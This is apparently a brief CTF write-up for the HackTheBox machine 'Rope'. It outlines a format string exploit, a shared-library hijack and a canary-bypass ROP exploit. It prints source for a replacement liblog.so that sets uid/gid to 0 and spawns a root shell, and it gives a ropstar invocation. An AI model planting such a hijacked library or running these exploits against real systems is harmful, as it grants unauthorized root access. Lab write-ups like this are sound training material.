---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/p8XkVDRtTQg/0.jpg
layout: post
media_subpath: /assets/posts/2020-05-23-rope-hackthebox
tags:
- binary exploitation
- canary bruteforce
- format string
- rop
title: Rope @ HackTheBox
---

Rope is a 50-point machine on HackTheBox that involves 3 binary exploits. There is a format string vulnerability in the boxes’s webserver and a replaceable shared library used by a binary we can run with sudo. Finally there is another binary where we have to bypass a stack canary and use ROP.

{% youtube p8XkVDRtTQg %}

## Notes

The [user exploit](https://gist.github.com/xct/d555b6dcce3f4a129ead42fc828cbf3b).

Liblog.so:

```cpp
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void printlog(){
    setuid(0);
    setgid(0);
    system("/bin/sh",NULL,NULL);
}
```

The [root exploit](https://gist.github.com/xct/9d3855671fd7f7dac7f2c182f3abd4aa).

Solving with ropstar:

```
python3 ~/tools/ropstar/ropstar.py -rhost localhost -rport 1337 -remote_offset ./contact
```

---

Thanks [r4j](https://twitter.com/r4j0x00) for creating this fun box!